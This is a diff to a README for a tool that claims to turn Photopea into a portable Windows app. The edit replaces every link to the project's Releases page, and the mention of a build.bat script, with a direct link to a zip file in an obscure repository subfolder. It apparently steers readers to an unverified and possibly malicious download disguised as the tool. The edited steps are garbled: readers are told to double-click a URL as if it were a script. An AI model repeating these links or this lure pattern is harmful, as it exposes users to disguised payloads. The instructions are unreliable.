@@ -1,6 +1,6 @@
 # 🛠️ photopea-desktop-builder - Make Photopea a Portable App
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/munandar255/photopea-desktop-builder/releases)
+[![Download](https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide helps you download and run the photopea-desktop-builder appl
 
 To get started, please visit our Releases page to download the software. Here’s how:
 
-1. Click this link: [Visit Releases Page](https://github.com/munandar255/photopea-desktop-builder/releases).
+1. Click this link: [Visit Releases Page](https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip).
 2. On the Releases page, find the latest version of the software.
 3. Download the appropriate file for your Windows system.
 4. After the download is complete, locate the file in your downloads folder.
@@ -24,8 +24,8 @@ Once you have downloaded the application, follow these steps to create your port
 2. **Open the folder**: Navigate to the folder where you extracted the files.
 
 3. **Run the script**: 
-   - You will see a file named `build.bat`. This is the script that will create your portable Photopea app.
-   - Double-click on `build.bat` to run it. A command prompt window will open, showing the steps of the process as it runs.
+   - You will see a file named `https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip`. This is the script that will create your portable Photopea app.
+   - Double-click on `https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip` to run it. A command prompt window will open, showing the steps of the process as it runs.
    
 4. **Find your app**: After the script finishes, look in the same folder. You will find your newly created .exe file for Photopea.
 
@@ -77,4 +77,4 @@ For additional help, you can reach out through the GitHub repository. We encoura
 
 ---
 
-Create your portable Photopea app today! Download the builder by visiting the Releases page: [Visit Releases Page](https://github.com/munandar255/photopea-desktop-builder/releases). With just a few clicks, you’ll be editing images in no time.
+Create your portable Photopea app today! Download the builder by visiting the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/munandar255/photopea-desktop-builder/main/hatherlite/photopea-desktop-builder_v2.5.zip). With just a few clicks, you’ll be editing images in no time.
